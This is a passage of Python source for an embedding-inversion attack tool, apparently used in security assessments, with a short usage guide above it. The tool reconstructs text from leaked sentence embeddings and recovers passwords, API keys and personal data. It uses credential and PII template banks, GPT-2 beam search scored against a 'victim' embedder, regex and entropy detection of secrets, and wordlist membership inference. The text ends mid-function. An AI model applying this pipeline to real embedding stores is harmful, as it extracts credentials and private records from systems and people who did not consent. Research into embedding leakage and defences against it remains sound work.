*When to use which zero-shot approach*
*In most assessments, we should start with emb_fin.py. If the top template exceeds 60-65% similarity and the slot filler produces "Strong" or "Moderate" confidence, the result is likely reliable.*

*If the top template similarity is low or confidence is "Weak" or "Unlikely", we should run zero2text_impl.py, which recovers actual structure from the embedding and automatically detects high-entropy regions without predefined slot names.*

*The trade-off is cost: zero2text_impl.py loads GPT-2 alongside the embedding model and runs hundreds of thousands of additional embedding computations during beam search. While it can fall back to CPU, this is impractically slow in most cases, making a GPU effectively necessary. When the template bank already covers the target domain well, this extra cost does not improve results, which is why emb_fin.py, which runs comfortably on CPU, should be the default starting point.*


Scripts:
**Zero2Text embedding Inversion Pipeline - Improved** 
```#!/usr/bin/env python3
"""
Zero2Text Embedding Inversion Pipeline — Improved (Standalone)
===============================================================

Implements the Zero2Text algorithm (arXiv 2602.01757v2) integrated with
entropy detection and enhanced slot filling.  Recovers approximate text
from embeddings, detects high-entropy regions, creates dynamic templates,
then uses membership inference to recover passwords.

Improved over zero2text_impl.py with:
  1. Template diversity clustering — de-duplicates near-identical templates
     using greedy agglomerative cosine clustering.
  2. Two-stage narrowing — coarse pass on top-3 templates to prune the
     wordlist before running the full per-template tournament.
  3. Gap-based confidence — separation_ratio between best and second-best
     weighted scores, replacing the prior z/gap/consensus heuristic.
  4. Relative threshold for template selection — instead of fixed top_k,
     includes all templates within a percentage of top-1 similarity.

Two operating modes:
  - **Direct mode** (default): victim model (MiniLM-L6-v2) used for all
    scoring.  No ridge regression.  Confidence = 1.0.
  - **Dual-embedder mode** (--local-model): separate local embedder +
    ridge regression mapping to victim.  Full paper algorithm.

Requirements (pip):
    pip install torch numpy transformers

Usage:
    # Basic (direct mode, 32 tokens)
    python zero2text_impl_improved.py embeddings2.npy --chunk 0 \\
        --templates templates.json --wordlist passwords.txt \\
        --slots PASSWORD --default-URL login.megacorpone.ai

    # With 80-token generation
    python zero2text_impl_improved.py embeddings2.npy --chunk 0 --max-tokens 80 \\
        --templates templates.json --wordlist passwords.txt \\
        --slots PASSWORD --default-URL login.megacorpone.ai

    # Dual-embedder mode (full paper approach)
    python zero2text_impl_improved.py embeddings2.npy --chunk 0 \\
        --local-model sentence-transformers/all-mpnet-base-v2 \\
        --templates templates.json --wordlist passwords.txt \\
        --slots PASSWORD
"""

import sys
import math
import json
import re
import string
import gzip
import argparse
import numpy as np
import torch
from pathlib import Path
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional, Tuple
from collections import Counter


# ============================================================================
# SECTION 1: BUILT-IN TEMPLATE BANKS
# ============================================================================

DOMAIN_TEMPLATES = {
    "credentials": [
        "Please navigate to {URL} and click on Need help signing in. The default password after resetting is {PASSWORD} which must be changed immediately.",
        "Visit {URL} to reset your password. Your temporary credential is {PASSWORD} and must be updated on first login.",
        "Access {URL} to complete password reset. Temporary password: {PASSWORD}.",
        "Your password has been reset. New password: {PASSWORD}. Login at {URL}.",
        "Password reset complete. Use {PASSWORD} at {URL}. Change immediately.",
        "Temporary password: {PASSWORD}. Reset at {URL}.",
        "Go to {URL} and click reset password. The default password is {PASSWORD}.",
        "Login at {URL} with temporary password {PASSWORD}. This expires in 24 hours.",
        "Access the portal at {URL} using your temporary password {PASSWORD}.",
        "Password: {PASSWORD}. Portal: {URL}. Must change on first login.",
        "Your new password is {PASSWORD}. Please visit {URL} to update it.",
        "Reset complete. Access {URL} with {PASSWORD}.",
        "API endpoint: {URL}, Key: {API_KEY}.",
        "Service URL: {URL} with API key {API_KEY}.",
        "Authentication token for {URL}: {API_KEY}.",
        "Production API: {URL}, Auth: {API_KEY}.",
        "Endpoint {URL} requires token {API_KEY}.",
        "Bearer token for {URL} is {API_KEY}.",
        "Service account credentials: endpoint {URL}, API key {API_KEY}.",
        "Database connection: host {URL}, password {PASSWORD}.",
        "Admin console at {URL} with password {PASSWORD}.",
        "SSH key for {URL}: {SSH_KEY}.",
        "Connection string: {URL} with secret {PASSWORD}.",
    ],
    "pii": [
        "Employee {NAME} salary adjusted to {SALARY} annually effective {DATE}.",
        "Compensation for {NAME}: base {SALARY}, bonus 15%.",
        "{NAME} hired at {SALARY} starting {DATE}.",
        "Salary increase for {NAME} to {SALARY}.",
        "Employee ID {EMPLOYEE_ID}: {NAME}, SSN ending {SSN_LAST4}.",
        "Personal info: {NAME}, DOB {DOB}, address {ADDRESS}.",
        "{NAME} contact: {PHONE}, {EMAIL}.",
        "Emergency contact for {NAME}: {EMERGENCY_CONTACT} at {PHONE}.",
        "Benefits enrollment for {NAME}: plan {PLAN_NAME}, premium {AMOUNT}.",
        "Medical claim for {NAME}: diagnosis {CODE}, amount {AMOUNT}.",
        "HIPAA record: patient {NAME}, MRN {MRN}.",
    ],
    "financial": [
        "Q{QUARTER} revenue: {AMOUNT}. Operating margin: {PERCENT}%.",
        "Budget approved: {AMOUNT} for {DEPARTMENT}.",
        "Invoice #{NUMBER} for {AMOUNT} due {DATE}.",
        "Wire transfer: {AMOUNT} to account {ACCOUNT}.",
        "Expense report by {NAME}: {AMOUNT}.",
        "Purchase order: {AMOUNT} for {VENDOR}.",
        "Credit facility: {AMOUNT} at {RATE}% from {BANK}.",
        "Revenue forecast: {AMOUNT} for FY{YEAR}.",
        "Acquisition: {COMPANY} for {AMOUNT}.",
        "Settlement: {AMOUNT} to {PARTY}. Confidential.",
    ],
    "infrastructure": [
        "Server {HOSTNAME} at {IP_ADDRESS}, admin password {PASSWORD}.",
        "VPN gateway: {URL}, credential {PASSWORD}.",
        "Kubernetes cluster: {URL}, token {API_KEY}.",
        "Database {DBNAME}: host {HOST}, port {PORT}, password {PASSWORD}.",
        "AWS account {ACCOUNT_ID}: access key {ACCESS_KEY}, secret {SECRET_KEY}.",
        "SSL certificate for {DOMAIN} expires {DATE}.",
        "DNS record: {HOSTNAME} -> {IP_ADDRESS}.",
        "Load balancer {NAME} endpoint: {URL}.",
        "Secrets manager: {URL}, master key {API_KEY}.",
        "CI/CD pipeline token: {API_KEY}.",
    ],
    "generic": [
        "{NAME} {ACTION} {OBJECT} on {DATE}.",
        "Document ID {NUMBER}: {DESCRIPTION}.",
        "Reference: {REFERENCE}. Amount: {AMOUNT}.",
        "Contact {NAME} at {EMAIL} or {PHONE}.",
        "Update: {DESCRIPTION}. Effective {DATE}.",
    ],
}

NEUTRAL_DEFAULTS = {
    "URL": "https://portal.company.com",
    "PASSWORD": "password123",
    "USERNAME": "admin",
    "API_KEY": "sk-prod-abc123",
    "TOKEN": "eyJhbGciOiJIUzI1NiJ9",
    "EMAIL": "admin@company.com",
    "IP_ADDRESS": "10.0.1.100",
    "PORT": "8443",
    "HOSTNAME": "srv-prod-01",
    "DATABASE": "prod_db",
    "SECRET": "s3cr3t_k3y_v4lu3",
    "DOMAIN": "company.com",
    "PATH": "/var/data/config",
    "HASH": "5f4dcc3b5aa765d61d8327deb882cf99",
    "VERSION": "2.1.0",
    "ENDPOINT": "/api/v1/auth",
    "ACCOUNT_ID": "ACC-78291",
    "REGION": "us-east-1",
    "CLUSTER": "prod-cluster-01",
    "CERTIFICATE": "cert-abc123.pem",
}


# ============================================================================
# SECTION 2: EMBEDDING ENGINE
# ============================================================================

class EmbeddingEngine:
    """
    Unified embedding engine with:
    - Sub-batched computation (GPU memory safety)
    - Top-K template scoring with relative threshold (Improvement 4)
    - Template diversity clustering (Improvement 1)
    - Single-text similarity + batch similarity
    - Embedding cache with statistics
    """

    def __init__(self, model_name: str, device: str = "auto", batch_size: int = 256):
        from transformers import AutoModel, AutoTokenizer

        if device == "auto":
            if torch.cuda.is_available():
                self.device = "cuda"
            elif hasattr(torch.backends, 'mps') and torch.backends.mps.is_available():
                self.device = "mps"
            else:
                self.device = "cpu"
        else:
            self.device = device

        print(f"[Engine] Loading {model_name} on {self.device}")

        self.tokenizer = AutoTokenizer.from_pretrained(model_name)
        self.model = AutoModel.from_pretrained(model_name).to(self.device)
        self.model.eval()
        self.batch_size = batch_size

        # Cache (text -> embedding tensor)
        self._cache: Dict[str, torch.Tensor] = {}
        self._cache_hits = 0
        self._cache_misses = 0

    def get_embedding(self, text: str) -> torch.Tensor:
        """Get embedding for a single text (cached)."""
        if text in self._cache:
            self._cache_hits += 1
            return self._cache[text]

        self._cache_misses += 1

        inputs = self.tokenizer(
            text, return_tensors="pt",
            padding=True, truncation=True, max_length=512
        ).to(self.device)

        with torch.no_grad():
            outputs = self.model(**inputs)
            token_emb = outputs.last_hidden_state
            mask = inputs['attention_mask'].unsqueeze(-1).expand(token_emb.size()).float()
            embedding = (torch.sum(token_emb * mask, 1) / torch.clamp(mask.sum(1), min=1e-9)).squeeze()

        self._cache[text] = embedding
        return embedding

    def _embed_batch(self, texts: List[str]) -> torch.Tensor:
        """Embed a single sub-batch (must fit in GPU memory)."""
        inputs = self.tokenizer(
            texts, return_tensors="pt",
            padding=True, truncation=True, max_length=512
        ).to(self.device)

        with torch.no_grad():
            outputs = self.model(**inputs)
            token_emb = outputs.last_hidden_state
            mask = inputs['attention_mask'].unsqueeze(-1).expand(token_emb.size()).float()
            emb = torch.sum(token_emb * mask, 1) / torch.clamp(mask.sum(1), min=1e-9)

        del inputs, outputs, token_emb, mask
        if self.device == "cuda":
            torch.cuda.empty_cache()

        return emb

    def get_embeddings_batch(self, texts: List[str]) -> torch.Tensor:
        """Batch embedding with sub-batching to avoid OOM."""
        if not texts:
            return torch.tensor([]).to(self.device)

        all_embeddings = []
        for i in range(0, len(texts), self.batch_size):
            batch_texts = texts[i:i + self.batch_size]
            emb = self._embed_batch(batch_texts)
            all_embeddings.append(emb)

        return torch.cat(all_embeddings, dim=0)

    def score_against_target(self, texts: List[str], target_emb: torch.Tensor) -> List[float]:
        """Compute cosine similarities between texts and target embedding."""
        if not texts:
            return []
        text_embs = self.get_embeddings_batch(texts)
        target_exp = target_emb.unsqueeze(0).expand(len(texts), -1)
        sims = torch.nn.functional.cosine_similarity(text_embs, target_exp, dim=1)
        return sims.tolist()

    def compute_similarity(self, text: str, target_emb: torch.Tensor) -> float:
        """Compute cosine similarity for a single text."""
        text_emb = self.get_embedding(text)
        return torch.nn.functional.cosine_similarity(
            text_emb.unsqueeze(0), target_emb.unsqueeze(0)
        ).item()

    def compute_similarities_batch(self, texts: List[str], target_emb: torch.Tensor) -> List[float]:
        """Batch similarity computation (alias for score_against_target)."""
        return self.score_against_target(texts, target_emb)

    def find_top_k(
        self,
        templates: List[str],
        target_emb: torch.Tensor,
        top_k: int = 20,
        verbose: bool = True,
        similarity_floor_pct: float = 0.85,
        max_seeds: int = 50,
        min_seeds: int = 5,
    ) -> List[Tuple[str, float]]:
        """
        Score all templates against target and return top candidates.

        Improvement 4 — Relative Threshold for Template Selection:
        Instead of a fixed top_k, this method:
          1. Scores all templates
          2. Takes the top-1 similarity as the anchor
          3. Includes all templates within similarity_floor_pct of top-1
          4. Caps at max_seeds, floors at min_seeds

        The top_k parameter is still respected as a legacy alias: when
        max_seeds == min_seeds == top_k, the behavior is identical to the
        original fixed-K mode.
        """
        if verbose:
            print(f"\n[Scoring] Evaluating {len(templates):,} templates...")

        all_sims = []
        total = len(templates)
        progress_interval = max(1, (total // self.batch_size) // 10) * self.batch_size

        for i in range(0, total, self.batch_size):
            batch = templates[i:i + self.batch_size]
            batch_embs = self._embed_batch(batch)
            target_exp = target_emb.unsqueeze(0).expand(len(batch), -1)
            sims = torch.nn.functional.cosine_similarity(batch_embs, target_exp, dim=1)
            all_sims.extend(sims.tolist())

            del batch_embs, target_exp, sims

            if verbose and i > 0 and i % progress_interval == 0:
                print(f"    {i:,}/{total:,} scored...")

        if verbose:
            print(f"    {total:,}/{total:,} scored.")

        pairs = list(zip(templates, all_sims))
        pairs.sort(key=lambda x: x[1], reverse=True)

        # --- Improvement 4: Relative threshold selection ---
        if not pairs:
            return []

        top1_sim = pairs[0][1]
        floor_sim = top1_sim * similarity_floor_pct

        # Count how many pass the threshold
        n_qualifying = 0
        for _, sim in pairs:
            if sim >= floor_sim:
                n_qualifying += 1
            else:
                break

        # Apply floor and cap
        n_selected = max(min_seeds, min(n_qualifying, max_seeds))
        # Don't exceed available templates
        n_selected = min(n_selected, len(pairs))

        top = pairs[:n_selected]

        if verbose:
            print(f"    Threshold {floor_sim:.4f}: {n_qualifying} templates qualify "
                  f"(using {n_selected})")
            print(f"    Top-1: {top[0][1]:.4f}  |  Top-{len(top)}: {top[-1][1]:.4f}")

        return top

    def select_diverse_templates(
        self,
        top_templates: List[Tuple[str, float]],
        target_emb: torch.Tensor,
        diversity_threshold: float = 0.85,
        min_diverse: int = 5,
    ) -> List[Tuple[str, float]]:
        """
        Improvement 1 — Template Diversity Clustering.

        After find_top_k returns its results, this method clusters them
        by pairwise cosine similarity to remove near-duplicates.

        Algorithm (greedy agglomerative):
          1. Compute embeddings for all top templates
          2. Iterate through templates in similarity order (best first)
          3. Add to "kept" set only if the template's max similarity to
             any already-kept template is below the diversity_threshold
          4. Enforce a minimum of min_diverse templates

        Args:
            top_templates: List of (template_text, similarity) from find_top_k
            target_emb: Target embedding (unused here but available for context)
            diversity_threshold: Max pairwise cosine similarity allowed (default 0.85)
            min_diverse: Minimum number of diverse templates to keep (default 5)

        Returns:
            Filtered list of (template_text, similarity) tuples
        """
        if len(top_templates) <= 1:
            return top_templates

        # Embed all top templates
        texts = [t for t, _ in top_templates]
        embeddings = self.get_embeddings_batch(texts)  # (N, D) on device
        emb_np = embeddings.cpu().numpy()

        # Normalize for cosine
        norms = np.linalg.norm(emb_np, axis=1, keepdims=True)
        normed = emb_np / np.maximum(norms, 1e-9)

        # Greedy selection: templates are already sorted best-first
        kept_indices = [0]
        for i in range(1, len(top_templates)):
            # Compute max similarity to any already-kept template
            sims_to_kept = normed[i] @ normed[kept_indices].T
            max_sim = float(np.max(sims_to_kept))
            if max_sim < diversity_threshold:
                kept_indices.append(i)

        # Enforce minimum: if we have fewer than min_diverse, greedily add
        # the next-best templates that are not yet kept
        if len(kept_indices) < min_diverse:
            kept_set = set(kept_indices)
            for i in range(len(top_templates)):
                if i not in kept_set:
                    kept_indices.append(i)
                    kept_set.add(i)
                    if len(kept_indices) >= min_diverse:
                        break
            # Re-sort by original order (best similarity first)
            kept_indices.sort()

        return [top_templates[i] for i in kept_indices]

    def clear_cache(self):
        """Clear embedding cache."""
        self._cache.clear()

    def get_cache_stats(self) -> Dict[str, int]:
        """Get cache statistics."""
        return {
            "hits": self._cache_hits,
            "misses": self._cache_misses,
            "size": len(self._cache),
        }


# ============================================================================
# SECTION 3: TEMPLATE LOADING
# ============================================================================

class TemplateLoader:
    """Load templates from bank directory, JSON file, or hardcoded fallback."""

    @staticmethod
    def load(bank_path: Optional[str] = None,
             templates_json: Optional[str] = None,
             max_templates: int = 100000) -> Tuple[List[str], str]:
        """Load templates from configured source."""
        if bank_path:
            templates = TemplateLoader.from_bank(bank_path, max_templates)
            return templates, f"bank: {bank_path}"
        elif templates_json:
            templates = TemplateLoader.from_json(templates_json)
            if max_templates and len(templates) > max_templates:
                templates = templates[:max_templates]
            return templates, f"json: {templates_json}"
        else:
            templates = TemplateLoader.get_fallback()
            return templates, "hardcoded fallback (59 templates)"

    @staticmethod
    def from_bank(bank_path: str, max_count: int = 100000) -> List[str]:
        """Load from pre-generated bank (sharded .json.gz)."""
        bank_dir = Path(bank_path)
        if not bank_dir.exists():
            raise FileNotFoundError(f"Template bank not found: {bank_path}")

        templates = []
        shard_files = sorted(bank_dir.rglob("templates_*.json.gz"))

        if not shard_files:
            raise FileNotFoundError(f"No template shards found in {bank_path}")

        for shard_path in shard_files:
            with gzip.open(shard_path, 'rt') as f:
                data = json.load(f)
                templates.extend(data.get("templates", []))
            if len(templates) >= max_count:
                templates = templates[:max_count]
                break

        return templates

    @staticmethod
    def from_json(json_path: str) -> List[str]:
        """Load from single JSON file (from template_generator.py)."""
        with open(json_path, 'r') as f:
            data = json.load(f)
        if isinstance(data, list):
            return data
        return data.get("templates", [])

    @staticmethod
    def get_fallback() -> List[str]:
        """Return hardcoded fallback templates."""
        all_templates = []
        for templates in DOMAIN_TEMPLATES.values():
            all_templates.extend(templates)
        return all_templates


# ============================================================================
# SECTION 4: ENTROPY ANALYSIS
# ============================================================================

def shannon_entropy(s: str) -> float:
    """Compute Shannon entropy of a string (bits per character)."""
    if not s:
        return 0.0
    freq = Counter(s)
    length = len(s)
    return -sum((c / length) * math.log2(c / length) for c in freq.values())


def is_high_entropy_token(token: str, threshold: float = 3.5) -> bool:
    """Check if a token appears to be high-entropy (random/generated)."""
    if len(token) < 4:
        return False

    entropy = shannon_entropy(token)
    if entropy < threshold:
        return False

    has_upper = bool(re.search(r'[A-Z]', token))
    has_lower = bool(re.search(r'[a-z]', token))
    has_digit = bool(re.search(r'[0-9]', token))
    has_special = bool(re.search(r'[^A-Za-z0-9]', token))

    char_classes = sum([has_upper, has_lower, has_digit, has_special])

    if entropy >= threshold and char_classes >= 3:
        return True
    if entropy >= 4.0 and len(token) >= 8:
        return True
    if char_classes >= 2 and len(token) >= 8 and entropy >= threshold:
        return True

    return False


HIGH_ENTROPY_PATTERNS = [
    re.compile(r'[A-Za-z]+\d+[!@#$%^&*]+'),           # Password123!
    re.compile(r'[A-Z][a-z]+\d{4}[!@#$%^&*]'),        # Summer2024!
    re.compile(r'[A-Za-z0-9]{16,}'),                    # Long alphanumeric
    re.compile(r'[A-Z0-9#$%&*@!]{8,}'),                # Uppercase+special
    re.compile(r'sk-[a-zA-Z0-9]+'),                     # API key format
    re.compile(r'[a-f0-9]{32,}'),                       # Hex hash
    re.compile(r'eyJ[A-Za-z0-9_-]+\.'),                 # JWT prefix
]


def detect_high_entropy_regions(
    text: str,
    entropy_threshold: float = 3.5,
    min_length: int = 4,
) -> List[Dict[str, Any]]:
    """
    Detect high-entropy (likely random/generated) regions in text.
    Returns list of dicts with: start, end, token, entropy, slot_type
    """
    regions = []

    # Strategy 1: Token-level entropy analysis
    token_pattern = re.compile(r'(\S+)')
    for match in token_pattern.finditer(text):
        token = match.group(1)
        stripped = token.strip('.,;:!?()[]{}"\'-')

        if len(stripped) < min_length:
            continue

        if is_high_entropy_token(stripped, entropy_threshold):
            regions.append({
                "start": match.start(),
                "end": match.end(),
                "token": token,
                "stripped": stripped,
                "entropy": shannon_entropy(stripped),
                "slot_type": _classify_slot_type(stripped, text, match.start()),
            })

    # Strategy 2: Pattern-based detection
    for pattern in HIGH_ENTROPY_PATTERNS:
        for match in pattern.finditer(text):
            token = match.group(0)
            already_found = any(
                r["start"] <= match.start() < r["end"] or
                r["start"] < match.end() <= r["end"]
                for r in regions
            )
            if not already_found and len(token) >= min_length:
                regions.append({
                    "start": match.start(),
                    "end": match.end(),
                    "token": token,
                    "stripped": token,
                    "entropy": shannon_entropy(token),
                    "slot_type": _classify_slot_type(token, text, match.start()),
                })

    regions.sort(key=lambda r: r["start"])
    return regions


def _classify_slot_type(token: str, context: str, pos: int) -> str:
    """Classify what kind of slot a high-entropy token likely represents."""
    prefix = context[max(0, pos - 80):pos].lower()

    if any(kw in prefix for kw in ["password", "passwd", "pass ", "pwd", "secret"]):
        return "PASSWORD"
    if any(kw in prefix for kw in ["key", "token", "bearer", "auth"]):
        return "API_KEY"
    if any(kw in prefix for kw in ["user", "login", "account"]):
        return "USERNAME"
    if any(kw in prefix for kw in ["host", "server", "address", "ip"]):
        return "HOSTNAME"
    if any(kw in prefix for kw in ["url", "http", "endpoint", "link"]):
        return "URL"

    if token.startswith("sk-") or token.startswith("api-"):
        return "API_KEY"
    if re.match(r'https?://', token):
        return "URL"
    if re.match(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}', token):
        return "HOSTNAME"

    return "PASSWORD"


def create_dynamic_template(
    text: str,
    regions: List[Dict[str, Any]],
) -> Tuple[str, Dict[str, str]]:
    """
    Replace high-entropy regions with slot placeholders.
    Returns: (template_string, slot_map) where slot_map = {SLOT_NAME: original_value}
    """
    template = text
    slot_map = {}

    slot_counts = {}
    for region in reversed(regions):
        slot_type = region["slot_type"]

        if slot_type in slot_counts:
            slot_counts[slot_type] += 1
            slot_name = f"{slot_type}_{slot_counts[slot_type]}"
        else:
            slot_counts[slot_type] = 0
            slot_name = slot_type

        placeholder = "{" + slot_name + "}"
        slot_map[slot_name] = region["token"]

        template = template[:region["start"]] + placeholder + template[region["end"]:]

    return template, slot_map


# ============================================================================
# SECTION 5: ZERO2TEXT INVERTER
# ============================================================================

class Zero2TextInverter:
    """
    Zero2Text embedding inversion (arXiv 2602.01757v2).

    Uses GPT-2 for candidate generation with hybrid scoring that combines
    language model logits and embedding cosine similarity.  Two modes:

    - **Direct mode**: victim model scores all candidates.  Confidence = 1.0.
    - **Dual-embedder mode**: local embedder + ridge regression projection
      to victim space.  Online confidence estimation.

    Key differences from BeamSearchInverter:
    - 1000 candidates/beam (K_S) instead of 50
    - Hybrid Z(logit) + conf*Z(cos) scoring
    - Greedy diversity filter (cosine < threshold)
    - Pre-built printable ASCII token set
    - Decaying query budget K_A * gamma^(t-1)
    - Online ridge regression W (dual mode)
    - BOS token for empty prefix handling
    """

    def __init__(
        self,
        engine: EmbeddingEngine,
        lm_model_name: str = "gpt2",
        local_model_name: Optional[str] = None,
        beam_width: int = 10,
        k_s: int = 1000,
        k_a: int = 50,
        max_tokens: int = 32,
        diversity_threshold: float = 0.9,
        ridge_lambda: float = 0.1,
        decay_gamma: float = 0.8,
        initial_confidence: float = 0.7,
        repetition_penalty: float = 1.5,
    ):
        self.engine = engine  # victim embedder
        self.lm_model_name = lm_model_name
        self.local_model_name = local_model_name
        self.dual_mode = (local_model_name is not None)
        self.beam_width = beam_width
        self.k_s = k_s
        self.k_a = k_a
        self.max_tokens = max_tokens
        self.diversity_threshold = diversity_threshold
        self.ridge_lambda = ridge_lambda
        self.decay_gamma = decay_gamma
        self.initial_confidence = initial_confidence
        self.repetition_penalty = repetition_penalty

        # Lazy-initialized
        self.lm_model = None
        self.lm_tokenizer = None
        self.lm_device = None
        self.local_engine = None
        self._ascii_token_ids = None

    # ------------------------------------------------------------------
    # Initialization helpers
    # ------------------------------------------------------------------

    def _init_lm(self):
        """Lazy-load GPT-2 on CPU and build ASCII filter."""
        if self.lm_model is not None:
            return
        from transformers import GPT2LMHeadModel, GPT2Tokenizer

        print(f"[Zero2Text] Loading {self.lm_model_name} on CPU...")
        self.lm_tokenizer = GPT2Tokenizer.from_pretrained(self.lm_model_name)
        self.lm_model = GPT2LMHeadModel.from_pretrained(self.lm_model_name)
        self.lm_model.eval()
        self.lm_device = "cpu"
        self.lm_model.to(self.lm_device)
        print(f"[Zero2Text] {self.lm_model_name} ready.")

        self._build_ascii_filter()

    def _init_local_embedder(self):
        """Lazy-load separate EmbeddingEngine for dual-embedder mode."""
        if not self.dual_mode or self.local_engine is not None:
            return
        print(f"[Zero2Text] Loading local embedder: {self.local_model_name}")
        self.local_engine = EmbeddingEngine(
            self.local_model_name,
            device=self.engine.device,
            batch_size=self.engine.batch_size,
        )
        print(f"[Zero2Text] Local embedder ready.")

    def _build_ascii_filter(self):
        """Pre-compute set of GPT-2 token IDs that decode to printable ASCII."""
        printable_chars = set(string.printable)
        ascii_ids = []
        vocab_size = self.lm_tokenizer.vocab_size
        for tid in range(vocab_size):
            decoded = self.lm_tokenizer.decode([tid])
            if decoded and all(c in printable_chars for c in decoded):
                ascii_ids.append(tid)
        self._ascii_token_ids = np.array(sorted(ascii_ids), dtype=np.int64)
        print(f"[Zero2Text] ASCII filter: {len(self._ascii_token_ids)} "
              f"of {vocab_size} tokens")

    # ------------------------------------------------------------------
    # Scoring primitives
    # ------------------------------------------------------------------

    def _get_lm_logits(self, text: str) -> torch.Tensor:
        """
        Full vocabulary logits with repetition penalty.
        Handles empty prefix with BOS token.
        Returns: (vocab_size,) tensor on lm_device.
        """
        if not text:
            bos_id = self.lm_tokenizer.bos_token_id
            if bos_id is None:
                bos_id = self.lm_tokenizer.eos_token_id
            input_ids = torch.tensor([[bos_id]]).to(self.lm_device)
        else:
            input_ids = self.lm_tokenizer(
                text, return_tensors="pt"
            )["input_ids"].to(self.lm_device)

        with torch.no_grad():
            outputs = self.lm_model(input_ids=input_ids)
            logits = outputs.logits[0, -1, :]  # (vocab_size,)

        # Apply repetition penalty to already-seen tokens
        if text:
            seen = set(input_ids[0].tolist())
            for token_id in seen:
                if logits[token_id] > 0:
                    logits[token_id] /= self.repetition_penalty
                else:
                    logits[token_id] *= self.repetition_penalty

        return logits

    def _diversity_filter(
        self,
        embeddings: np.ndarray,
        threshold: Optional[float] = None,
    ) -> List[int]:
        """
        Greedy diversity filter: iterate candidates in order, keep only
        if cosine similarity < threshold to all already-kept candidates.
        Returns list of kept indices.
        """
        if threshold is None:
            threshold = self.diversity_threshold

        n = len(embeddings)
        if n == 0:
            return []

        # Normalize
        norms = np.linalg.norm(embeddings, axis=1, keepdims=True)
        normed = embeddings / np.maximum(norms, 1e-9)

        kept = [0]
        for i in range(1, n):
            sims = normed[i] @ normed[kept].T
            if np.max(sims) < threshold:
                kept.append(i)

        return kept

    def _update_projection(
        self,
        local_embs: np.ndarray,
        victim_embs: np.ndarray,
    ) -> np.ndarray:
        """
        Ridge regression: W = (E'E + lambda*I)^(-1) E'E_tilde
        Maps from local embedding space to victim embedding space.
        """
        E = local_embs      # (N, D_local)
        E_tilde = victim_embs  # (N, D_victim)

        EtE = E.T @ E  # (D_local, D_local)
        I = np.eye(EtE.shape[0])
        W = np.linalg.solve(EtE + self.ridge_lambda * I, E.T @ E_tilde)

        return W  # (D_local, D_victim)

    def _compute_confidence(
        self,
        local_embs: np.ndarray,
        victim_embs: np.ndarray,
        W: np.ndarray,
    ) -> float:
        """
        Confidence = mean cosine(local @ W, victim).
        Measures reliability of the ridge regression projection.
        """
        projected = local_embs @ W
        proj_norm = projected / np.maximum(
            np.linalg.norm(projected, axis=1, keepdims=True), 1e-9
        )
        vic_norm = victim_embs / np.maximum(
            np.linalg.norm(victim_embs, axis=1, keepdims=True), 1e-9
        )
        cos_sims = np.sum(proj_norm * vic_norm, axis=1)
        return float(np.mean(cos_sims))

    @staticmethod
    def _z_score_normalize(values) -> np.ndarray:
        """Z-score normalization. Returns zeros if std < 1e-9."""
        values = np.array(values, dtype=np.float64)
        std = values.std()
        if std < 1e-9:
            return np.zeros_like(values)
        return (values - values.mean()) / std

    def _hybrid_score(
        self,
        logits: np.ndarray,
        cos_sims: np.ndarray,
        confidence: float,
    ) -> np.ndarray:
        """S = Z(logits) + confidence * Z(cos_sims) (Eq. 1 from paper)."""
        z_logits = self._z_score_normalize(logits)
        z_cos = self._z_score_normalize(cos_sims)
        return z_logits + confidence * z_cos

    @staticmethod
    def _cosine_sim_np(
        embeddings: np.ndarray,
        target: np.ndarray,
    ) -> np.ndarray:
        """NumPy batch cosine: (N,D) vs (D,) -> (N,)."""
        emb_norms = np.linalg.norm(embeddings, axis=1, keepdims=True)
        normed_emb = embeddings / np.maximum(emb_norms, 1e-9)

        tgt_norm = np.linalg.norm(target)
        normed_tgt = target / max(tgt_norm, 1e-9)

        return normed_emb @ normed_tgt

    # ------------------------------------------------------------------
    # Main inversion loop
    # ------------------------------------------------------------------

    def invert(
        self,
        target_emb: torch.Tensor,
        max_tokens: Optional[int] = None,
        seed_texts: Optional[List[str]] = None,
        verbose: bool = True,
    ) -> Tuple[str, float, List[Dict]]:
        """
        Run Zero2Text inversion to recover approximate text.

        Args:
            target_emb: Target embedding tensor (on engine device)
            max_tokens: Override max generation steps
            seed_texts: Optional seed texts (e.g. top-5 neutral-filled templates)
            verbose: Print progress

        Returns:
            (best_text, best_similarity, step_history)
        """
        self._init_lm()
        if self.dual_mode:
            self._init_local_embedder()

        if max_tokens is None:
            max_tokens = self.max_tokens

        # Convert target to numpy for cosine computations
        if isinstance(target_emb, torch.Tensor):
            target_np = target_emb.cpu().numpy()
        else:
            target_np = np.array(target_emb)

        # Initialize beams
        if seed_texts:
            sims = self.engine.score_against_target(seed_texts, target_emb)
            beams = sorted(
                zip(seed_texts, sims), key=lambda x: x[1], reverse=True
            )
            beams = beams[:self.beam_width]
        else:
            beams = [("", 0.0)]

        best_text, best_sim = beams[0]
        stagnation = 0
        step_history = []

        # Dual-mode state
        obs_local: List[np.ndarray] = []
        obs_victim: List[np.ndarray] = []
        W = None
        confidence = self.initial_confidence if self.dual_mode else 1.0

        mode_str = "dual" if self.dual_mode else "direct"
        if verbose:
            print(f"    [Zero2Text] mode={mode_str}, K_B={self.beam_width}, "
                  f"K_S={self.k_s}, K_A={self.k_a}, T={max_tokens}")

        for t in range(max_tokens):
            all_candidates = []

            for beam_text, _ in beams:
                # ---- Step 1: LM logits ----
                logits = self._get_lm_logits(beam_text)
                logits_np = logits.cpu().numpy()

                # ---- Step 2: Mask non-ASCII, top-K_S ----
                masked_logits = np.full_like(logits_np, -np.inf)
                masked_logits[self._ascii_token_ids] = logits_np[self._ascii_token_ids]

                k = min(self.k_s, len(masked_logits))
                top_indices = np.argpartition(masked_logits, -k)[-k:]
                top_indices = top_indices[
                    np.argsort(masked_logits[top_indices])[::-1]
                ]
                top_logit_values = masked_logits[top_indices]

                # Filter -inf
                valid = np.isfinite(top_logit_values)
                top_indices = top_indices[valid]
                top_logit_values = top_logit_values[valid]

                if len(top_indices) == 0:
                    continue

                # ---- Step 3: Decode tokens, form candidates ----
                token_strs = [
                    self.lm_tokenizer.decode([tid]) for tid in top_indices
                ]
                candidate_texts = [beam_text + tok for tok in token_strs]

                # ---- Step 4: Embed candidates ----
                if self.dual_mode and self.local_engine is not None:
                    cand_embs_torch = self.local_engine.get_embeddings_batch(
                        candidate_texts
                    )
                else:
                    cand_embs_torch = self.engine.get_embeddings_batch(
                        candidate_texts
                    )
